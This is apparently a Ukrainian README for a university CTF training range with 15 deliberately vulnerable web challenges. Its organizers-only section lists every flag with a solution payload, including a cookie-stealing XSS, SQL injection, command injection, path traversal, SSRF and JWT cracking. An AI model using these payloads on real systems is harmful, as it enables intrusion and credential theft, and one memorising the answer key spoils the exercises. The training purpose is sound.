# LNTU Local Cyber Range (Університетський CTF ЛНТУ)

CTFd + **15 навчальних тасків** (кожен — окремий сайт у Docker) + опційно OpenVPN для гравців.
Усі сайти оформлені єдиним стилем (`challenges/_shared`), україномовні, дані вигадані.

## 🚀 Швидкий старт
```bash
chmod +x ctf.sh
./ctf.sh setup            # Docker, збірка, запуск усього
# створіть адміна в CTFd (http://IP:8000), далі Admin → Settings → Access Tokens
./ctf.sh populate <TOKEN> # додає всі 15 тасків + прапори + підказки
./ctf.sh check            # перевіряє, що кожен таск проходиться і віддає свій прапор
```
IP для гравців береться автоматично; змінити: `CTF_HOST=10.10.15.124 ./ctf.sh populate <TOKEN>`.

## 🗺 Таски

| № | Назва | Категорія | Бали | Адреса |
|---|-------|-----------|------|--------|
| 1 | ВолиньГаз — Шаблони заяв | Web / SSTI | 300 | http://HOST:8081 |
| 2 | ВолиньВода — Чужий рахунок | Web / IDOR | 100 | http://HOST:8082 |
| 3 | LNTU Cyber Blog — Куки модератора | Web / XSS | 400 | http://HOST:8083 |
| 4 | Затвор — Пошук без меж | Web / SQLi | 300 | http://HOST:8084 |
| 5 | LNTU Accounts — Витік токена | Web / Authentication | 150 | http://HOST:8085 |
| 6 | Autumn Archive — Хвіст файлу | OSINT / Forensics | 300 | http://HOST:8086 |
| 7 | Деканат — Підміна ролі | Web / Cookies | 150 | http://HOST:8087 |
| 8 | Бібліотека API — Слабкий секрет | Web / JWT | 350 | http://HOST:8088 |
| 9 | Е-Архів — Вихід за межі каталогу | Web / LFI | 250 | http://HOST:8089 |
| 10 | LNTU NOC — Ping із сюрпризом | Web / Command Injection | 300 | http://HOST:8090 |
| 11 | ВолиньОбленерго — Забута резервна копія | Web / Recon | 100 | http://HOST:8091 |
| 12 | SIGINT — Шари кодування | Crypto / Encoding | 200 | http://HOST:8092 |
| 13 | Intranet — Свій серед своїх | Web / HTTP Headers | 200 | http://HOST:8093 |
| 14 | Фотоархів — Приховане в пікселях | Forensics / Stego | 350 | http://HOST:8094 |
| 15 | LinkPreview — Звернення всередину | Web / SSRF | 450 | http://HOST:8095 |

Разом: 3900 балів. Підказка в CTFd коштує 50 балів.

## 🚩 Прапори та рішення (для організаторів, не показувати гравцям)
1. `CTF{v0lyn_g4s_sst1_3xpl01t_2026}` — У полі «Примітка» → `{{config.SECRET_FLAG}}`
2. `CTF{v0lyn_v0d4_1d0r_s3cr3t_fl4g}` — `/user?id=1337`
3. `CTF{xss_st0r3d_4dm1n_c00k13_st34l}` — Пост `<img src=x onerror="fetch('/collect?d='+encodeURIComponent(document.cookie))">`, потім `/inbox`
4. `CTF{z4tv0r_sqli_byp4ss_m4st3r}` — `/?q=' UNION SELECT 1,flag,3 FROM secrets-- `
5. `CTF{r3s3t_t0k3n_1s_n0t_s3cr3t}` — Скинути `admin` → у відповіді посилання з токеном → відкрити його
6. `CTF{autumn_fox_metadata_tells_the_story}` — `strings evidence.png` — прапор після маркера IEND
7. `CTF{c00k13_r0l3_t4mp3r1ng_l4nds_4dm1n}` — Кука `session_data` (Base64 JSON): змінити role на admin → `/admin`
8. `CTF{jwt_w34k_s3cr3t_cr4ck3d}` — Зламати секрет `lntu2026` (hashcat -m 16500) → підробити `role=admin`
9. `CTF{p4th_tr4v3rs4l_n0t_s0_s4f3}` — `/view?file=....//....//etc/lntu/flag.txt`
10. `CTF{c0mm4nd_1nj3ct10n_p1p3_th3_fl4g}` — `127.0.0.1|cat /flag.txt`
11. `CTF{r0b0ts_txt_l34ks_b4ckups}` — `/robots.txt` → `/backup/site_config.old` → логін на `/admin/login`
12. `CTF{l4y3r3d_3nc0d1ng_1s_n0t_3ncrypt10n}` — HEX → Base64 → ROT13
13. `CTF{h34d3rs_4r3_us3r_c0ntr0ll3d}` — `X-Forwarded-For: 10.x.x.x`, `User-Agent: LNTU-Staff`, `Referer: http://intranet.lntu.local/`
14. `CTF{lsb_st3g0_h1d1ng_1n_pl41n_s1ght}` — LSB червоного каналу: `zsteg -a photo.png`
15. `CTF{ssrf_1nt3rn4l_s3rv1c3_r34ch3d}` — `/?url=http://127.1:9000/internal/flag`

## ⚙ Керування
`./ctf.sh help` — повний список (`up`, `down`, `restart <сервіс>`, `rebuild <сервіс>`, `status`, `logs`, `check`, `vpn-init`, `vpn-up`, `clean`).
Сервіси тасків називаються `flag1_ctf` … `flag15_ctf`.

## 📁 Структура
```
ctf.sh                     керування
docker-compose.yaml        CTFd + MariaDB + Redis + 15 тасків (+ openvpn за профілем vpn)
challenges/_shared/        спільний стиль (theme.css, ui.py)
challenges/flagN_ctf/      код таска N (app.py, Dockerfile, requirements.txt)
scripts/challenges.py      єдине джерело: назви, бали, прапори, підказки, порти
scripts/populate_ctfd.py   наповнення CTFd через API
scripts/check_challenges.py  автоматична самоперевірка всіх тасків
```
